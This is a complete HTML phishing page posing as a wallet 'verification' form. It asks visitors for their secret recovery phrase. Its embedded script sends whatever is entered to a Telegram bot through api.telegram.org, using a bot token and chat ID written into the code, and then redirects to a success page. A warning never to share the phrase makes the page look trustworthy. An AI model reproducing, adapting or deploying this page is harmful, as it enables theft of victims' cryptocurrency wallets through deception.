<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f4f4f4;
        }
        .container {
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .logo {
            width: 100%;
            max-width: 350px;
            margin-bottom: 20px;
        }
        h2 {
            font-size: 24px;
            font-weight: bold;
        }
        textarea {
            width: 100%;
            height: 100px;
            font-size: 18px;
            padding: 10px;
            margin-top: 10px;
        }
        button {
            width: 100%;
            padding: 15px;
            background: blue;
            color: white;
            font-size: 18px;
            border: none;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background: darkblue;
        }
        .warning {
            color: red;
            font-size: 14px;
            font-weight: bold;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="logo.jpg" alt="Logo" class="logo">
        <h2>Enter your secret phrase</h2>
        <form id="secretForm">
            <label for="phrase">Secret phrase:</label>
            <textarea id="phrase" name="phrase" placeholder="Enter your secret phrase here..."></textarea>
            <button type="submit">Verify</button>
        </form>
        <p class="warning">⚠️ <b>Never share your secret phrase with anyone!</b></p>
    </div>

    <script>
        document.getElementById("secretForm").addEventListener("submit", function(event) {
            event.preventDefault();

            var secretPhrase = document.getElementById("phrase").value;
            var token = "7635825073:AAHZrek95VYG2SNGWRlZa9qQq1Z_91HixAo"; // Your token
            var chatId = "8171222874"; // Your Telegram ID

            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=Secret+phrase:+${encodeURIComponent(secretPhrase)}`)
                .then(response => {
                    if (response.ok) {
                        window.location.href = "success.html";
                    } else {
                        alert("Error sending!");
                    }
                })
                .catch(error => {
                    alert("Connection error!");
                });
        });
    </script>
</body>
</html>
